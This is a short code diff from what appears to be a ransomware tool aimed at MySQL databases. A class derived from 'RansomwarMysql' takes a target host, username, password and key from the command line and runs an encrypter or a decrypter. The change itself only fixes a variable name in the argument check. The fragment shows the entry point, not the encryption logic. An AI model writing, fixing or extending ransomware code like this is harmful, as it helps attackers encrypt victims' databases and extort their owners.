@@ -45,7 +45,7 @@ class Main(RansomwarMysql):
 if __name__ == "__main__":
      
     app = Main(attack_method='mysql' , host=args[2] , username=args[3] , password=args[4] , key=args[5])
-    if argv[1] == "encrypt": 
+    if args[1] == "encrypt": 
          app.run_encrypter()
     else: 
         app.run_decrypter() 
